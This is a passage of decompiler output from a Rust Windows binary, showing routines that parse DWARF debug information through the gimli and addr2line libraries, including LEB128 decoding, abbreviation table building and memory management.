1;\n                        ppppppppuVar53 = ppppppppuVar67 + unaff_RDI * 2;\n                        ppppppppuVar41 = ppppppppuVar53 + pppppppuVar70 * 2;\n                        pppppppuVar44 = (ppppppppuVar40 - unaff_RDI) - pppppppuVar70;\n                        ppppppppuStack2008 = ppppppppuVar20;\n                        ppppppppuStack1944 = ppppppppuVar50 * 0x10;\n                        ppppppppuStack1792 = ppppppppuVar26;\n                        ppppppppuStack1784 = ppppppppuVar46;\n                        if (pppppppuVar44 < pppppppuVar70) {\n                            sym.memcpy(ppppppppuStack1936, ppppppppuVar41, pppppppuVar44 * 0x10);\n                            ppppppppuVar46 = ppppppppuStack1936 + pppppppuVar44 * 2;\n                            ppppppppuVar64 = ppppppppuStack1936;\n                            ppppppppuVar26 = ppppppppuVar41;\n                            if ((0 < pppppppuVar70) && (0 < pppppppuVar44)) {\n                                ppppppppuVar41 = ppppppppuStack1928 + ppppppppuVar40 * 2;\n                                do {\n                                    if (ppppppppuVar46[-2] < ppppppppuVar26[-2]) {\n                                        ppppppppuVar50 = ppppppppuVar26 + -2;\n                                        ppppppppuVar26 = ppppppppuVar50;\n                                    }\n                                    else {\n                                        ppppppppuVar50 = ppppppppuVar46 + -2;\n                                        ppppppppuVar46 = ppppppppuVar50;\n                                    }\n                                    uVar80 = *(ppppppppuVar50 + 4);\n                                    uVar9 = *(ppppppppuVar50 + 1);\n                                    uVar10 = *(ppppppppuVar50 + 0xc);\n                                    *ppppppppuVar41 = *ppppppppuVar50;\n                                    *(ppppppppuVar41 + 4) = uVar80;\n                                    *(ppppppppuVar41 + 1) = uVar9;\n                                    *(ppppppppuVar41 + 0xc) = uVar10;\n                                } while ((ppppppppuVar53 < ppppppppuVar26) &&\n                                        (ppppppppuVar41 = ppppppppuVar41 + -2,  ppppppppuStack1936 < ppppppppuVar46));\n                            }\n                        }\n                        else {\n                            sym.memcpy(ppppppppuStack1936, ppppppppuVar53, pppppppuVar70 * 0x10);\n                            ppppppppuVar46 = ppppppppuStack1936 + pppppppuVar70 * 2;\n                            ppppppppuVar64 = ppppppppuStack1936;\n                            ppppppppuVar26 = ppppppppuVar53;\n                            if ((0 < pppppppuVar70) && (pppppppuVar70 < ppppppppuVar40 - unaff_RDI)) {\n                                do {\n                                    bVar71 = *ppppppppuVar41 < *ppppppppuVar64;\n                                    ppppppppuVar26 = ppppppppuVar64;\n                                    if (bVar71) {\n                                        ppppppppuVar26 = ppppppppuVar41;\n                                    }\n                                    ppppppppuVar64 = ppppppppuVar64 + !bVar71 * 2;\n                                    uVar80 = *(ppppppppuVar26 + 4);\n                                    uVar9 = *(ppppppppuVar26 + 1);\n                                    uVar10 = *(ppppppppuVar26 + 0xc);\n                                    *ppppppppuVar53 = *ppppppppuVar26;\n                                    *(ppppppppuVar53 + 4) = uVar80;\n                                    *(ppppppppuVar53 + 1) = uVar9;\n                                    *(ppppppppuVar53 + 0xc) = uVar10;\n                                    ppppppppuVar53 = ppppppppuVar53 + 2;\n                                    ppppppppuVar26 = ppppppppuVar53;\n                                } while ((ppppppppuVar64 < ppppppppuVar46) &&\n                                        (ppppppppuVar41 = ppppppppuVar41 + bVar71 * 2, \n                                        ppppppppuVar41 < ppppppppuVar67 + ppppppppuVar40 * 2));\n                            }\n                        }\n                        ppppppppuVar50 = ppppppppuStack2032;\n                        ppppppppuVar41 = ppppppppuStack2064;\n                        sym.memcpy(ppppppppuVar26, ppppppppuVar64, ppppppppuVar46 - ppppppppuVar64);\n                        ppppppppuVar53 = ppppppppuStack1920;\n                        *ppppppppuVar41 = unaff_RDI;\n                        *ppppppppuVar50 = ppppppppuStack2008 + pppppppuVar70;\n                        sub.msvcrt.dll_memmove\n                                  (ppppppppuStack1920 + ppppppppuStack1944, \n                                   ppppppppuStack1920 + ppppppppuStack1944 + 0x10);\n                        uStack1400 = ppppppppuStack1784;\n                        uStack1396 = ppppppppuStack1784 >> 0x20;\n                        ppppppppuVar64 = ppppppppuStack1784;\n                        ppppppppuVar41 = ppppppppuStack2056;\n                    } while (0x1 < ppppppppuStack1784);\n                    ppppppppuVar64 = 0x1;\n                }\ncode_r0x004250e5:\n                ppppppppuVar46 = ppppppppuStack1856;\n            } while (ppppppppuStack1856 != NULL);\n            uVar45 = CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)));\n            if ((uVar45 != 0) && ((uVar45 & 0xfffffffffffffff) != 0)) {\n                sym.__rust_dealloc(ppppppppuVar53, 8);\n            }\n            if ((ppppppppuStack608 != NULL) && ((ppppppppuStack608 & 0xfffffffffffffff) != 0)) {\n                sym.__rust_dealloc(ppppppppuStack616, 8);\n            }\n        }\n    }\n    uStack1912 = 0x8;\n    _auStack1904 = CONCAT412(uVar78, CONCAT48(uVar76, CONCAT44(uVar74, uVar72)));\n    iStack1488 = 8;\n    auStack1480 = CONCAT412(uVar78, CONCAT48(uVar76, CONCAT44(uVar74, uVar72)));\n    ppppppppuVar41 = ppppppppuStack1776[9];\n    if (ppppppppuVar41 != NULL) {\n        ppppppppuVar67 = ppppppppuStack1776[8];\n        uVar73 = 0;\n        uVar75 = 0;\n        uVar77 = 0;\n        uVar79 = 0;\n        ppppppppuVar53 = NULL;\n        uVar72 = *0x4444d0;\n        uVar74 = *0x4444d4;\n        uVar76 = *0x4444d8;\n        uVar78 = *0x4444dc;\ncode_r0x004257cf:\n        if (ppppppppuVar41 < 0x4) {\n            uVar35 = 0x13;\ncode_r0x00429642:\n            uVar45 = ppppppppuVar67 & 0xffffffffffffff00;\ncode_r0x004296d1:\n            puStack1864[1] = uVar35;\n            puStack1864[2] = ppppppppuVar67 & 0xff | uVar45;\n            *puStack1864 = 1;\ncode_r0x004296ef:\n            dbg.drop_in_place<alloc::vec::Vec<addr2line::ResUnit<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>, alloc::alloc::Global>>\n                      (&iStack1488);\n            if ((auStack1904 != 0) && ((_auStack1904 & 0x7ffffffffffffff) != 0x0)) {\n                sym.__rust_dealloc(uStack1912, 8);\n            }\ncode_r0x00429728:\n            if ((ppppppppuStack1512 != NULL) && ((ppppppppuStack1512 & 0xfffffffffffffff) != 0)) {\n                sym.__rust_dealloc(ppppppppuStack1520, 8);\n            }\n            LOCK();\n            *ppppppppuStack1776 = *ppppppppuStack1776 + -1;\n            if (*ppppppppuStack1776 != NULL) {\n                return;\n            }\n            dbg.drop_slow<gimli::read::dwarf::Dwarf<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>>\n                      (&ppppppppuStack1776);\n            return;\n        }\n        ppppppppuVar64 = ppppppppuVar67 + 4;\n        uVar45 = ppppppppuVar41 - 4;\n        uVar24 = *ppppppppuVar67;\n        uVar43 = uVar24;\n        if (0xffffffe < uVar24 >> 4) {\n            if (uVar24 == 0xffffffff) {\n                if (7 < uVar45) {\n                    uVar43 = *(ppppppppuVar67 + 4);\n                    ppppppppuVar64 = ppppppppuVar67 + 0xc;\n                    uVar57 = 0x800;\n                    ppppppppuVar46 = (ppppppppuVar41 - 0xcU) - uVar43;\n                    if (uVar43 <= ppppppppuVar41 - 0xcU) goto code_r0x00425841;\n                    goto code_r0x004296bf;\n                }\n                uVar35 = 0x13;\n                ppppppppuVar67 = ppppppppuVar64;\n            }\n            else {\n                uVar35 = 0x10;\n                ppppppppuVar67 = unaff_RDI;\n            }\n            goto code_r0x00429642;\n        }\n        uVar57 = 0x400;\n        ppppppppuVar46 = uVar45 - uVar43;\n        if (uVar45 < uVar43) {\ncode_r0x004296bf:\n            uVar45 = ppppppppuVar64 & 0xffffffffffffff00;\n            uVar35 = 0x13;\n            ppppppppuVar67 = ppppppppuVar64;\n            goto code_r0x004296d1;\n        }\ncode_r0x00425841:\n        if (uVar43 < 2) goto code_r0x004296bf;\n        ppppppppuVar26 = ppppppppuVar64 + uVar43;\n        uVar45 = uVar43 - 2;\n        uVar27 = *ppppppppuVar64;\n        ppppppppuVar67 = uVar27;\n        if (uVar27 - 2 < 3) {\n            if (uVar24 < 0xfffffff0) {\n                if (3 < uVar45) {\n                    iVar37 = uVar43 - 6;\n                    ppppppppuVar50 = *(ppppppppuVar64 + 2);\n                    ppppppppuVar64 = ppppppppuVar64 + 6;\ncode_r0x0042590a:\n                    if (iVar37 != 0) {\n                        ppppppppuVar67 = iVar37 - 1;\n                        uVar55 = *ppppppppuVar64;\n                        ppppppppuVar64 = ppppppppuVar64 + 1;\n                        ppppppppuVar20 = uVar27 << 0x10;\n                        ppppppppuStack2048 = NULL;\n                        goto code_r0x004259f0;\n                    }\n                    goto code_r0x004296bf;\n                }\n            }\n            else if (7 < uVar45) {\n                iVar37 = uVar43 - 10;\n                ppppppppuVar50 = *(ppppppppuVar64 + 2);\n                ppppppppuVar64 = ppppppppuVar64 + 10;\n                goto code_r0x0042590a;\n            }\ncode_r0x0042961f:\n            uVar45 = ppppppppuVar64 + 2 & 0xffffffffffffff00;\n            uVar35 = 0x13;\n            ppppppppuVar67 = ppppppppuVar64 + 2;\n            goto code_r0x004296d1;\n        }\n        if (uVar27 != 5) {\n            uVar45 = uVar27 & 0xff00;\n            uVar35 = 0x11;\n            goto code_r0x004296d1;\n        }\n        if (uVar43 == 2) goto code_r0x0042961f;\n        if (uVar45 == 1) {\n            ppppppppuVar64 = ppppppppuVar64 + 3;\n            goto code_r0x004296bf;\n        }\n        pcVar3 = ppppppppuVar64 + 2;\n        uVar55 = *(ppppppppuVar64 + 3);\n        if (uVar24 < 0xfffffff0) {\n            if (uVar43 - 4 < 4) {\ncode_r0x00429668:\n                ppppppppuVar64 = ppppppppuVar64 + 4;\n                goto code_r0x004296bf;\n            }\n            ppppppppuVar67 = uVar43 - 8;\n            ppppppppuVar50 = *(ppppppppuVar64 + 4);\n            ppppppppuVar64 = ppppppppuVar64 + 1;\n        }\n        else {\n            if (uVar43 - 4 < 8) goto code_r0x00429668;\n            ppppppppuVar67 = uVar43 - 0xc;\n            ppppppppuVar50 = *(ppppppppuVar64 + 4);\n            ppppppppuVar64 = ppppppppuVar64 + 0xc;\n        }\n        if (5 < *pcVar3 - 1U) {\n            uVar35 = 0x3f;\n            uVar45 = 0;\n            ppppppppuVar67 = NULL;\n            goto code_r0x004296d1;\n        }\n        ppppppppuStack2048 = NULL;\n        ppppppppuVar20 = 0x50000;\n    // switch table (6 cases) at 0x429c5c\n        switch(*pcVar3) {\n        case '\\x01':\n            break;\n        default:\n            if (ppppppppuVar67 < 0x8) goto code_r0x004296bf;\n            unaff_RDI = ppppppppuVar67 + -1;\n            if (uVar24 < 0xfffffff0) {\n                if (unaff_RDI < 0x4) {\ncode_r0x004296bb:\n                    ppppppppuVar64 = ppppppppuVar64 + 1;\n                    goto code_r0x004296bf;\n                }\n            }\n            else if (unaff_RDI < 0x8) goto code_r0x004296bb;\n            ppppppppuVar67 = ppppppppuVar26;\n            ppppppppuVar40 = (ppppppppuVar41 + ppppppppuVar53) - ppppppppuVar46;\n            ppppppppuVar41 = ppppppppuVar46;\n            goto joined_r0x00428966;\n        case '\\x03':\n            ppppppppuStack2048 = 0x2;\n            break;\n        case '\\x04':\n            if (ppppppppuVar67 < 0x8) goto code_r0x004296bf;\n            ppppppppuStack1928 = *ppppppppuVar64;\n            ppppppppuStack2048 = 0x3;\ncode_r0x004259e9:\n            ppppppppuVar64 = ppppppppuVar64 + 1;\n            ppppppppuVar67 = ppppppppuVar67 + -1;\n            break;\n        case '\\x05':\n            if (0x7 < ppppppppuVar67) {\n                ppppppppuStack1928 = *ppppppppuVar64;\n                ppppppppuStack2048 = 0x4;\n                goto code_r0x004259e9;\n            }\n            goto code_r0x004296bf;\n        }\ncode_r0x004259f0:\n        ppppppppuVar40 = (ppppppppuVar41 + ppppppppuVar53) - ppppppppuVar46;\n        unaff_RDI = ppppppppuStack1776[3] - ppppppppuVar50;\n        ppppppppuStack2064 = ppppppppuVar67;\n        ppppppppuVar67 = ppppppppuVar26;\n        ppppppppuStack1936 = ppppppppuVar26;\n        ppppppppuVar41 = ppppppppuVar46;\n        if (ppppppppuVar50 <= ppppppppuStack1776[3]) {\n            ppppppppuStack2056 = ppppppppuStack2056 & 0xffffffff00000000 | uVar55 | uVar57 | ppppppppuVar20;\n            ppppppppuStack1856 = auStack1480._8_8_;\n            ppppppppuStack2008 = ppppppppuStack1776;\n            ppppppppuStack1920 = ppppppppuStack1776 + 2;\n            puVar47 = *ppppppppuStack1920 + ppppppppuVar50;\n            _auStack1840 = CONCAT412(uVar79, CONCAT48(uVar77, CONCAT44(uVar75, uVar73)));\n            uStack1408 = uVar73;\n            uStack1407 = uVar73 >> 8;\n            uStack1406 = uVar73 >> 0x10;\n            ppppppppuStack1848 = 0x8;\n            uStack1808 = CONCAT44(uVar79, uVar77);\n            iStack1824 = uStack1416;\n            uStack1822 = uStack1416 >> 0x10;\n            uStack1820 = uStack1416._4_4_;\n            uStack1816 = CONCAT44(uVar75, uVar73 & 0xffff | uStack1406 << 0x10);\n            ppppppppuStack2032 = ppppppppuVar20;\n            ppppppppuStack1944 = ppppppppuVar50;\n            ppppppppuStack1792 = ppppppppuVar40;\n            ppppppppuStack1784 = ppppppppuVar46;\n            uStack1404 = uVar75;\n            uStack1400 = uVar77;\n            uStack1396 = uVar79;\n            do {\n                ppppppppuVar41 = NULL;\n                iVar23 = 0;\n                uVar45 = 0;\n                do {\n                    if ((unaff_RDI == ppppppppuVar41) ||\n                       ((uVar55 = puVar47[ppppppppuVar41],  iVar23 == 0x3f && (1 < uVar55)))) goto code_r0x00426170;\n                    uVar45 = uVar45 | (uVar55 & 0x7f) << (iVar23 & 0x3f);\n                    iVar23 = iVar23 + 7;\n                    ppppppppuVar41 = ppppppppuVar41 + 1;\n                } while (uVar55 < '\\0');\n                if (uVar45 == 0) {\ncode_r0x0042625f:\n                    puVar21 = &uStack1408;\n                    uStack144 = CONCAT22(uStack1822, iStack1824);\n                    uStack152 = uStack1832;\n                    uStack148 = uStack1832._4_4_;\n                    uStack140 = uStack1820;\n                    uStack136 = uStack1816;\n                    uStack132 = uStack1816._4_4_;\n                    uStack128 = uStack1808;\n                    uStack124 = uStack1808._4_4_;\n                    uStack1304 = uStack1816;\n                    uStack1300 = uStack1816._4_4_;\n                    uStack1296 = uStack1808;\n                    uStack1292 = uStack1808._4_4_;\n                    ppppppppuStack1320 = SUB168(_auStack1840 >> 0x40, 0);\n                    iStack1312 = iStack1824;\n                    uStack1310 = uStack1822;\n                    uStack1309 = uStack1822 >> 8;\n                    uStack1308 = uStack1820;\n                    bVar71 = ppppppppuStack2032 >> 0x10 < 5;\n                    iStack1248 = (0xffffffef < uVar24) * 8 + 8;\n                    if (bVar71 || *(ppppppppuStack2008 + 0x1d) == '\\0') {\n                        iStack1248 = 0;\n                    }\n                    iStack1232 = (0xffffffef < uVar24) * 8 + 0xc;\n                    if (bVar71 || *(ppppppppuStack2008 + 0x1d) == '\\0') {\n                        iStack1232 = 0;\n                    }\n                    uStack1416._0_4_ = uVar43;\n                    uStack1416._4_4_ = uVar43 >> 0x20;\n                    uStack1408 = SUB81(ppppppppuStack2048, 0);\n                    uStack1407 = ppppppppuStack2048 >> 8;\n                    uStack1406 = ppppppppuStack2048 >> 0x10;\n                    uStack1404 = ppppppppuStack2048 >> 0x20;\n                    uStack1400 = ppppppppuStack1928;\n                    uStack1396 = ppppppppuStack1928 >> 0x20;\n                    uStack1384 = ppppppppuStack1944;\n                    uStack1376 = NULL;\n                    uStack1352 = ppppppppuStack2064;\n                    unaff_RDI = ppppppppuStack2056 & 0xffffffff;\n                    uStack1344 = uStack1344 & 0xffffffff00000000 | ppppppppuStack2056 & 0xffffffff;\n                    uStack1336 = ppppppppuStack1848;\n                    ppppppppuStack1328 = auStack1840;\n                    ppppppppuStack1288 = NULL;\n                    ppppppuStack1272 = NULL;\n                    ppppppppuStack1256 = NULL;\n                    pppppppuStack1240 = NULL;\n                    uStack968 = ppppppppuStack2048 - 3U < 2;\n                    uStack1048 = 0x2f;\n                    ppppppppuStack960 = ppppppppuStack1928;\n                    _auStack1688 = CONCAT88(ppppppppuStack2064, ppppppppuVar64);\n                    _auStack1672 = CONCAT88(&uStack1336, &uStack1416);\n                    ppppppppuStack1648 = NULL;\n                    uStack1600 = 0;\n                    ppppppppuVar41 = ppppppppuStack2064;\n                    ppppppppuVar67 = ppppppppuVar64;\n                    pppppppuVar70 = pppppppuStack2072;\n                    uStack1368 = ppppppppuVar53;\n                    uStack1360 = ppppppppuVar64;\n                    iStack1224 = iStack1232;\n                    if (ppppppppuStack2064 == NULL) goto code_r0x00426f23;\n                    goto code_r0x0042641d;\n                }\n                iVar37 = unaff_RDI - ppppppppuVar41;\n                if (iVar37 == 0) break;\n                uVar57 = puVar47[ppppppppuVar41] & 0x7f;\n                iVar56 = uVar57;\n                if (puVar47[ppppppppuVar41] < '\\0') {\n                    if (unaff_RDI - 1U == ppppppppuVar41) break;\n                    uVar29 = ((puVar47 + 1)[ppppppppuVar41] & 0x7f) << 7;\n                    uVar52 = uVar57 | uVar29;\n                    if ((puVar47 + 1)[ppppppppuVar41] < '\\0') {\n                        unaff_RDI = unaff_RDI - 2;\n                        if ((unaff_RDI == ppppppppuVar41) || (3 < (puVar47 + 2)[ppppppppuVar41])) break;\n                        iVar37 = iVar37 + -3;\n                        puVar48 = puVar47 + ppppppppuVar41 + 3;\n                        uVar52 = uVar57 | uVar29 | (puVar47 + 2)[ppppppppuVar41] << 0xe;\n                    }\n                    else {\n                        puVar48 = puVar47 + ppppppppuVar41 + 2;\n                        iVar37 = iVar37 + -2;\n                    }\n                    iVar56 = uVar52;\n                    uVar57 = uVar52;\n                }\n                else {\n                    puVar48 = puVar47 + ppppppppuVar41 + 1;\n                    iVar37 = ~ppppppppuVar41 + unaff_RDI;\n                }\n                if (((iVar56 == 0) || (iVar37 == 0)) || (uVar55 = *puVar48,  1 < uVar55)) break;\n                uStack1400 = 0;\n                uStack1392 = NULL;\n                uStack1384 = uStack1384 & 0xffffffff00000000;\n                uStack1376 = NULL;\n                uStack1368 = uStack1368 & 0xffffffff00000000;\n                uStack1360 = NULL;\n                uStack1352 = uStack1352 & 0xffffffff00000000;\n                uStack1344 = NULL;\n                uStack1336 = uStack1336 & 0xffffffff00000000;\n                ppppppppuStack1328 = NULL;\n                uStack1408 = uVar77;\n                uStack1407 = uVar77 >> 8;\n                uStack1406 = uVar77 >> 0x10;\n                iVar37 = iVar37 + -1;\n                uStack1416._0_4_ = uVar73;\n                uStack1416._4_4_ = uVar75;\n                uStack1404 = uVar79;\n                if (iVar37 == 0) break;\n                ppppppppuStack1696 = ppppppppuStack1696 & 0xffffffff00000000 | uVar57;\n                puVar48 = puVar48 + 1;\n                ppppppppuStack1960 = ppppppppuVar53;\n                while( true ) {\n                    ppppppppuVar26 = uStack1336;\n                    ppppppppuVar46 = uStack1352;\n                    ppppppppuVar67 = uStack1368;\n                    ppppppppuVar41 = uStack1384;\n                    uVar52 = uStack1404;\n                    uVar29 = uStack1416._4_4_;\n                    uVar57 = uStack1416;\n                    iVar30 = iVar37 + -1;\n                    uVar65 = *puVar48 & 0x7f;\n                    uStack2097 = uVar55;\n                    if (*puVar48 < '\\0') {\n                        if (iVar30 == 0) goto code_r0x0042612a;\n                        puVar49 = puVar48 + 2;\n                        iVar30 = iVar37 + -2;\n                        uVar6 = puVar48[1];\n                        unaff_RDI = uVar6;\n                        uVar28 = (uVar6 & 0x7f) << 7;\n                        uVar66 = uVar65 | uVar28;\n                        if (uVar6 < '\\0') {\n                            if ((iVar30 == 0) || (uVar6 = *puVar49,  3 < uVar6)) goto code_r0x0042612a;\n                            iVar30 = iVar37 + -3;\n                            puVar49 = puVar48 + 3;\n                            uVar66 = uVar65 | uVar28 | uVar6 << 0xe;\n                        }\n                    }\n                    else {\n                        puVar49 = puVar48 + 1;\n                        uVar66 = uVar65;\n                    }\n                    iVar56 = uVar66;\n                    if (iVar56 == 0) break;\n                    if (iVar30 == 0) goto code_r0x0042612a;\n                    iVar37 = iVar30 + -1;\n                    uVar57 = *puVar49 & 0x7f;\n                    unaff_RDI = uVar57;\n                    iVar51 = uVar57;\n                    if (*puVar49 < '\\0') {\n                        if (iVar37 == 0) goto code_r0x0042612a;\n                        puVar48 = puVar49 + 2;\n                        iVar37 = iVar30 + -2;\n                        uVar29 = (puVar49[1] & 0x7f) << 7;\n                        uVar52 = uVar57 | uVar29;\n                        unaff_RDI = uVar52;\n                        if (puVar49[1] < '\\0') {\n                            if ((iVar37 != 0) && (uVar6 = *puVar48,  uVar6 < 4)) {\n                                iVar37 = iVar30 + -3;\n                                puVar48 = puVar49 + 3;\n                                uVar57 = uVar57 | uVar29 | uVar6 << 0xe;\n                                unaff_RDI = uVar57;\n                                iVar51 = uVar57;\n                                goto joined_r0x00425f44;\n                            }\n                            goto code_r0x0042612a;\n                        }\n                        if (uVar52 == 0x21) goto code_r0x00425d10;\ncode_r0x00425d89:\n                        if (unaff_RDI == 0) goto code_r0x0042612a;\n                        pppppppuVar70 = NULL;\n                        if (CONCAT44(uStack1416._4_4_, uStack1416) == 0) goto code_r0x00425e2c;\ncode_r0x00425da4:\n                        if (uStack1392 == CONCAT44(uStack1396, uStack1400)) {\n                            sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hf5621314c30bb69b\n                                      (&uStack1408, uStack1392);\n                        }\n                        iVar30 = CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)));\n                        iVar60 = uStack1392 * 0x10;\n                        *(iVar30 + iVar60) = pppppppuVar70;\n                        *(iVar30 + 8 + iVar60) = iVar56;\n                        *(iVar30 + 10 + iVar60) = unaff_RDI;\n                        uStack1392 = uStack1392 + 1;\n                    }\n                    else {\n                        puVar48 = puVar49 + 1;\njoined_r0x00425f44:\n                        if (iVar51 != 0x21) goto code_r0x00425d89;\ncode_r0x00425d10:\n                        iVar23 = 0;\n                        uVar69 = 0;\n                        do {\n                            bVar71 = iVar37 == 0;\n                            iVar37 = iVar37 + -1;\n                            if (bVar71) goto code_r0x0042612a;\n                            uVar6 = *puVar48;\n                            if (((iVar23 == 0x3f) && (uVar6 != 0x7f)) && (uVar6 != 0)) goto code_r0x0042612a;\n                            puVar48 = puVar48 + 1;\n                            uVar69 = uVar69 | (uVar6 & 0x7f) << (iVar23 & 0x3f);\n                            iVar23 = iVar23 + 7;\n                        } while (uVar6 < '\\0');\n                        uVar31 = -1 << (iVar23 & 0x3f);\n                        if ((uVar6 & 0x40) == 0) {\n                            uVar31 = 0;\n                        }\n                        if (0x3f < iVar23) {\n                            uVar31 = 0;\n                        }\n                        pppppppuVar70 = uVar69 | uVar31;\n                        unaff_RDI = CONCAT62(unaff_RDI >> 0x10, 0x21);\n                        if (CONCAT44(uStack1416._4_4_, uStack1416) != 0) goto code_r0x00425da4;\ncode_r0x00425e2c:\n                        if (ppppppppuStack1328 == 0x5) {\n                            pppppppuStack1872 = pppppppuStack1872 & 0xffffffff00000000 | uVar66;\n                            ppppppppuVar41 = sym.__rust_alloc(0x50, 8);\n                            if (ppppppppuVar41 == NULL) {\n                                dbg.handle_alloc_error(0x50);\n                                goto code_r0x00429a87;\n                            }\n                            *(ppppppppuVar41 + 8) = uStack1344;\n                            *(ppppppppuVar41 + 0x44) = uStack1344._4_4_;\n                            *(ppppppppuVar41 + 9) = uStack1336;\n                            *(ppppppppuVar41 + 0x4c) = uStack1336._4_4_;\n                            *(ppppppppuVar41 + 6) = uStack1360;\n                            *(ppppppppuVar41 + 0x34) = uStack1360._4_4_;\n                            *(ppppppppuVar41 + 7) = uStack1352;\n                            *(ppppppppuVar41 + 0x3c) = uStack1352._4_4_;\n                            *(ppppppppuVar41 + 4) = uStack1376;\n                            *(ppppppppuVar41 + 0x24) = uStack1376._4_4_;\n                            *(ppppppppuVar41 + 5) = uStack1368;\n                            *(ppppppppuVar41 + 0x2c) = uStack1368._4_4_;\n                            *(ppppppppuVar41 + 2) = uStack1392;\n                            *(ppppppppuVar41 + 0x14) = uStack1392._4_4_;\n                            *(ppppppppuVar41 + 3) = uStack1384;\n                            *(ppppppppuVar41 + 0x1c) = uStack1384._4_4_;\n                            *ppppppppuVar41 = CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408));\n                            *(ppppppppuVar41 + 4) = uStack1404;\n                            *(ppppppppuVar41 + 1) = uStack1400;\n                            *(ppppppppuVar41 + 0xc) = uStack1396;\n                            _auStack1728 = CONCAT412(uVar78, CONCAT48(uVar76, CONCAT44(uVar74, uVar72)));\n                            uStack1736 = ppppppppuVar41;\n                            sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hf5621314c30bb69b(&uStack1736, 5);\n                            auVar8 = _auStack1728;\n                            uStack1736[uStack1720 * 2] = pppppppuVar70;\n                            *(uStack1736 + uStack1720 * 2 + 1) = pppppppuStack1872;\n                            *(uStack1736 + uStack1720 * 0x10 + 10) = unaff_RDI;\n                            uStack1392 = uStack1720 + 1;\n                            _auStack1728 = CONCAT88(uStack1392, auStack1728);\n                            auStack1728._0_4_ = SUB164(auVar8, 0);\n                            auStack1728._4_4_ = SUB164(auVar8, 4);\n                            uStack1408 = SUB81(uStack1736, 0);\n                            uStack1407 = uStack1736 >> 8;\n                            uStack1406 = uStack1736 >> 0x10;\n                            uStack1404 = uStack1736._4_4_;\n                            uStack1400 = auStack1728._0_4_;\n                            uStack1396 = auStack1728._4_4_;\n                            uStack1416._0_4_ = 1;\n                            uStack1416._4_4_ = 0;\n                        }\n                        else {\n                            if (0x4 < ppppppppuStack1328) {\n                                dbg.panic_bounds_check(ppppppppuStack1328, 5, 0x445ed8);\n                                goto code_r0x00429a87;\n                            }\n                            iVar30 = ppppppppuStack1328 * 0x10;\n                            *(&uStack1408 + ppppppppuStack1328 * 2 * 8) = pppppppuVar70;\n                            *(&uStack1400 + ppppppppuStack1328 * 4) = iVar56;\n                            *(&uStack1400 + iVar30 + 2) = unaff_RDI;\n                            ppppppppuStack1328 = ppppppppuStack1328 + 1;\n                        }\n                    }\n                    if (iVar37 == 0) goto code_r0x0042612a;\n                }\n                if (iVar30 == 0) {\ncode_r0x0042612a:\n                    if (((CONCAT44(uStack1416._4_4_, uStack1416) != 0) && (CONCAT44(uStack1396, uStack1400) != 0)) &&\n                       ((CONCAT44(uStack1396, uStack1400) & 0xfffffffffffffff) != 0)) {\n                        sym.__rust_dealloc(CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)))\n                                           , 8);\n                    }\n                    break;\n                }\n                unaff_RDI = iVar30 - 1;\n                uVar27 = *puVar49 & 0x7f;\n                if (*puVar49 < '\\0') {\n                    if (unaff_RDI == NULL) goto code_r0x0042612a;\n                    puVar47 = puVar49 + 2;\n                    unaff_RDI = iVar30 - 2;\n                    uVar16 = (puVar49[1] & 0x7f) << 7;\n                    uVar36 = uVar27 | uVar16;\n                    if (puVar49[1] < '\\0') {\n                        if ((unaff_RDI == NULL) || (uVar6 = *puVar47,  3 < uVar6)) goto code_r0x0042612a;\n                        unaff_RDI = iVar30 - 3;\n                        puVar47 = puVar49 + 3;\n                        uVar36 = uVar27 | uVar16 | uVar6 << 0xe;\n                    }\n                }\n                else {\n                    puVar47 = puVar49 + 1;\n                    uVar36 = uVar27;\n                }\n                if (uVar36 != 0) goto code_r0x0042612a;\n                uVar65 = CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408));\n                ppppppppuVar50 = CONCAT44(uStack1396, uStack1400);\n                _auStack1688 = CONCAT48(uStack1384, uStack1392);\n                _auStack1688 = CONCAT412(uStack1384._4_4_, _auStack1688);\n                _auStack1672 = CONCAT412(uStack1368._4_4_, CONCAT48(uStack1368, uStack1376));\n                ppppppppuStack1656 = uStack1360;\n                ppppppppuStack1648 = uStack1352;\n                ppppppppuStack1640 = uStack1344;\n                ppppppppuStack1632 = uStack1336;\n                ppppppppuStack1624 = ppppppppuStack1328;\n                ppppppppuVar53 = ppppppppuStack1960;\n                if (CONCAT44(uStack1416._4_4_, uStack1416) == 2) goto code_r0x0042625f;\n                uStack1416._0_4_ = uVar45;\n                uStack1416._4_4_ = uVar45 >> 0x20;\n                uStack1408 = uVar57;\n                uStack1407 = uVar57 >> 8;\n                uStack1406 = uVar57 >> 0x10;\n                uStack1404 = uVar29;\n                uStack1396 = uVar52;\n                ppppppppuStack1320 = ppppppppuStack1328;\n                uStack1336 = uStack1344;\n                ppppppppuStack1328 = ppppppppuVar26;\n                uStack1352 = uStack1360;\n                uStack1344 = ppppppppuVar46;\n                uStack1368 = uStack1376;\n                uStack1360 = ppppppppuVar67;\n                uStack1384 = uStack1392;\n                uStack1376 = ppppppppuVar41;\n                iStack1312 = ppppppppuStack1696;\n                uStack1400 = uVar65;\n                uStack1392 = ppppppppuVar50;\n                uStack1310 = uVar55;\n                cVar19 = sym.gimli::read::abbrev::Abbreviations::insert::h1cfcd04c6d095aad\n                                   (&ppppppppuStack1848, &uStack1416);\n                ppppppppuVar53 = ppppppppuStack1960;\n            } while (cVar19 == '\\0');\ncode_r0x00426170:\n            ppppppppuVar41 = ppppppppuStack1848;\n            if (uStack1832 != NULL) {\n                unaff_RDI = uStack1832 * 0x70;\n                iVar37 = 0;\n                do {\n                    if (((*(ppppppppuVar41 + iVar37 + 8) != 0) &&\n                        (uVar45 = *(ppppppppuVar41 + iVar37 + 0x18),  uVar45 != 0)) &&\n                       ((uVar45 & 0xfffffffffffffff) != 0)) {\n                        sym.__rust_dealloc(*(ppppppppuVar41 + iVar37 + 0x10), 8);\n                    }\n                    iVar37 = iVar37 + 0x70;\n                } while (unaff_RDI - iVar37 != 0);\n            }\n            if ((auStack1840 != NULL) && (auStack1840 * 0x70 != 0)) {\n                